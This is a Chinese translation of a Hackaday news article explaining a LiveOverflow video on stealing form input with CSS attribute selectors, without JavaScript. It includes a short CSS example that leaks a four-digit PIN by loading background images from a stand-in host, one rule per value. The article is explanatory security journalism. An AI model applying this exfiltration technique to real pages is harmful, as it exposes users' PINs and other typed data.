# CSS 窃取你的网络数据

> 原文：<https://hackaday.com/2018/02/25/css-steals-your-web-data/>

今年早些时候，我们发布了一个互动网页的链接。大多数人似乎都喜欢它，但我们至少收到了一条评论，说他们绝不会如此轻率地允许 JavaScript 在他们的电脑上运行。你可以争论这句话的相对价值，但它确实提醒我们，当涉及到互联网安全时，仅仅禁用 JavaScript 并不是万灵药。您可能想知道如何在不编写脚本的情况下窃取数据，当然，假设您不直接控制服务器或浏览器。答案是使用层叠样式表(CSS)。[Live Overflow] [解释了下面视频中的漏洞利用](https://www.youtube.com/watch?v=oJ6t7AImTdE)，涵盖了一篇旧论文和最近对该技术的重新发现。

这项技术取决于你如何将 CSS 放入网页。也许你已经部分损害了服务器，或者你写了一个恶意的浏览器扩展。方法之所以有效，是因为您可以使样式以元素的属性为条件。这意味着您可以要求 CSS 对具有特定值的文本字段进行一些特殊的格式化。如果格式化是从您控制的服务器加载一些背景图像，那么您可以判断该字段是否有特定的值。

我们没说这很容易。假设您想要获取一个四位数的 PIN 码。你将需要大约 10，000 行格式。例如:

```
input[type="pin"][value$="0000"] { background-color: url(http://notahackaday.com/0000.png }
input[type="pin"][value$="0001"] { background-color: url(http://notahackaday.com/0001.png }
...
input[type="pin"][value$="9999"] { background-color: url(http://notahackaday.com/9999.png }
```

这个想法是跟踪一个特定的客户端何时加载一个图像文件。那么你可以假设你知道哪个 PIN 号码存在。这是很痛苦的，如果您想要捕获社会保险号、信用卡号或任意文本，情况会更糟。此外，该技术对属性进行操作，但是——对我们来说不幸的是——为了简单起见，许多常见的框架将文本输入的值属性与其内容相同。这正中攻击者的下怀。

正如[Live Overflow]解释的那样，有些人称之为键盘记录器，但这有点牵强。我们认为键盘记录器可以在任何地方观察我们输入的内容。这只是在特定位置探测某些输入值。尽管如此，它确实说明了几乎任何技术都可能被恶意的程序员颠覆。

这个[说明了我们自己的【杰克·莱德劳】的引用](https://hackaday.com/2017/04/21/iot-security-is-hard-heres-what-you-need-to-know/):“保护设备最简单的方法就是关机。”结果最近[连你的洗碗机都不安全了](https://hackaday.com/blog/page/3/?s=security)。

 [https://www.youtube.com/embed/oJ6t7AImTdE?version=3&rel=1&showsearch=0&showinfo=1&iv_load_policy=1&fs=1&hl=en-US&autohide=2&wmode=transparent](https://www.youtube.com/embed/oJ6t7AImTdE?version=3&rel=1&showsearch=0&showinfo=1&iv_load_policy=1&fs=1&hl=en-US&autohide=2&wmode=transparent)

